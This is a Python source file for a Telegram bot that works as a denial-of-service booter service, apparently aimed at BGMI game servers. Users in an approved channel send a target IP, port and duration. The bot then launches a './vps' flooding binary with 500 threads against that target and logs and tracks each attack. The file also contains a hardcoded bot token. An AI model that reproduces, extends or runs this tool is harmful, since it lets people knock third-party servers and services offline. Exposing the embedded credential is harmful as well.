import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
from functools import partial

# Bot token and channel IDs
BOT_TOKEN = "6704057021:AAHPI7LcxVkUTmTZ75ulA41pU0tS0BSxm8k"
CHANNEL_ID = ["-1002004427126"]
OWNER_ID = {5759284972, 5142603617}  # Replace with your owner IDs

THREADS_COUNT = 500
BYTE_SIZE = 512

# Constants
INVALID_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
MAX_TIME = 120
COOLDOWN_TIME = 10
# Global variables
last_attack_time = {}
bgmi_blocked = False
admins_file = "admins.txt"
logs_file = "logs.txt"
admins = set()
ongoing_attacks = {}
scheduler = BackgroundScheduler()  # Initialize the scheduler
scheduler.start()  # Start the scheduler

# Admin management
def load_admins():
    global admins
    try:
        with open(admins_file, "r") as f:
            admins = {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        admins = OWNER_ID
        save_admins()

def save_admins():
    with open(admins_file, "w") as f:
        f.writelines(f"{admin_id}\n" for admin_id in admins)

# Logging
def log_attack(user_id, username, ip, port, time_sec):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(logs_file, "a") as f:
        f.write(f"{timestamp} - UserID: {user_id}, Username: {username}, IP: {ip}, Port: {port}, Time: {time_sec}\n")

# Helper to check channel membership
async def is_user_in_all_channels(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    for channel_id in CHANNEL_ID:
        try:
            member_status = await context.bot.get_chat_member(channel_id, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

# Attack completion notification
async def notify_attack_finished(context: ContextTypes.DEFAULT_TYPE, user_id: int, ip: str, port: int):
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ The attack on \n🖥️ IP: {ip},\n🖧 Port: {port} has finished."
    )
    ongoing_attacks.pop((user_id, ip, port), None)  # Remove from ongoing attacks

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_in_all_channels(user_id, context):
        await update.message.reply_text(
            "❌ Access Denied! Please join the required channels to use this bot.\n"
            "1. [Channel 1](https://t.me/+yjGbtaSabqY1MGE1)",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text("✅ Welcome! Use /bgmi to start.")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked, last_attack_time
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"

    if bgmi_blocked:
        await update.message.reply_text("⛔ The /bgmi command is currently blocked.")
        return

    if not await is_user_in_all_channels(user_id, context):
        await update.message.reply_text(
            "❌ Please join all required channels to use this command:\n"
            "1. [Channel 1](https://t.me/+yjGbtaSabqY1MGE1)",
            parse_mode="Markdown",
        )
        return

    now = datetime.now()
    last_time = last_attack_time.get(user_id, None)
    if user_id not in admins and user_id not in OWNER_ID:
        if last_time and (now - last_time).total_seconds() < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - (now - last_time).total_seconds()
            await update.message.reply_text(f"⏳ Please wait {int(remaining)} seconds before using this command again.")
            return

    if len(context.args) != 3:
        await update.message.reply_text("⚠️ Usage: /bgmi <ip> <port> <time>")
        return

    ip, port, time_str = context.args
    try:
        port = int(port)
        time_sec = int(time_str)
    except ValueError:
        await update.message.reply_text("⚠️ Invalid input. Port and time must be numeric.")
        return

    if port in INVALID_PORTS:
        await update.message.reply_text("⚠️ This port is not allowed.")
        return

    if user_id not in admins and time_sec > MAX_TIME:
        await update.message.reply_text("⚠️ Non-admins are limited to 120 seconds.")
        return

    try:
        subprocess.Popen(["./vps", ip, str(port), str(time_sec), str(BYTE_SIZE), str(THREADS_COUNT)])
        ongoing_attacks[(user_id, ip, port)] = {
            "username": username,
            "time": time_sec,
            "start_time": datetime.now(),
        }

        log_attack(user_id, username, ip, port, time_sec)
        last_attack_time[user_id] = now

        scheduler.add_job(
            partial(notify_attack_finished, context),
            "date",
            run_date=now + timedelta(seconds=time_sec),
            args=[user_id, ip, port],
        )
        await update.message.reply_text(f"✅ Attack started:\n🖥️ IP: {ip}\n🖧 Port: {port}\n⏳ Time: {time_sec} seconds")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to start attack: {e}")

async def ongoingattacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in admins:
        await update.message.reply_text("⛔ Only admins can view ongoing attacks.")
        return

    if not ongoing_attacks:
        await update.message.reply_text("ℹ️ No ongoing attacks.")
        return

    message = "🔹 Ongoing Attacks:\n"
    for (uid, ip, port), details in ongoing_attacks.items():
        elapsed = (datetime.now() - details["start_time"]).total_seconds()
        remaining = details["time"] - elapsed
        message += (
            f"🖥️ User: {details['username']} (ID: {uid})\n"
            f"🖧 IP: {ip}, Port: {port}\n"
            f"⏳ Time: {details['time']} sec, Remaining: {int(remaining)} sec\n\n"
        )

    await update.message.reply_text(message)

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in admins:
        await update.message.reply_text("⛔ Only admins can view logs.")
        return

    try:
        with open(logs_file, "r") as f:
            await update.message.reply_document(f)
    except FileNotFoundError:
        await update.message.reply_text("ℹ️ No logs available.")

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("⛔ Only the owner can add admins.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /addadmin <user_id>")
        return

    new_admin_id = int(context.args[0])
    admins.add(new_admin_id)
    save_admins()
    await update.message.reply_text(f"✅ User {new_admin_id} added as admin.")

async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_ID:
        await update.message.reply_text("⛔ Only the owner can remove admins.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /removeadmin <user_id>")
        return

    admin_id = int(context.args[0])
    admins.discard(admin_id)
    save_admins()
    await update.message.reply_text(f"✅ User {admin_id} removed from admin list.")

async def blockbgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked
    bgmi_blocked = True
    await update.message.reply_text("⛔ The /bgmi command has been blocked.")

async def unblockbgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bgmi_blocked
    bgmi_blocked = False
    await update.message.reply_text("✅ The /bgmi command has been unblocked.")

# Main function
def main():
    load_admins()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("ongoingattacks", ongoingattacks))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("removeadmin", removeadmin))
    app.add_handler(CommandHandler("blockbgmi", blockbgmi))
    app.add_handler(CommandHandler("unblockbgmi", unblockbgmi))

    app.run_polling()

if __name__ == "__main__":
    main()
